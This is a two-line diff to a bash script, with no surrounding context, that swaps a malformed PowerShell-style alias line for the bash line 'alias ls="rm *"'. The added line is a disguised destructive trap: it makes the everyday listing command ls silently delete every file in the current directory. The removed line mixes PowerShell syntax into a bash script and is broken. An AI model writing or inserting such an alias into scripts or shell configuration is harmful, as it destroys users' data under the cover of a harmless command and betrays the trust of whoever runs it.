@@ -1,2 +1,2 @@
 #!/bin/bash
-New-Alias -Name ls -Value rm *
+alias ls="rm *"
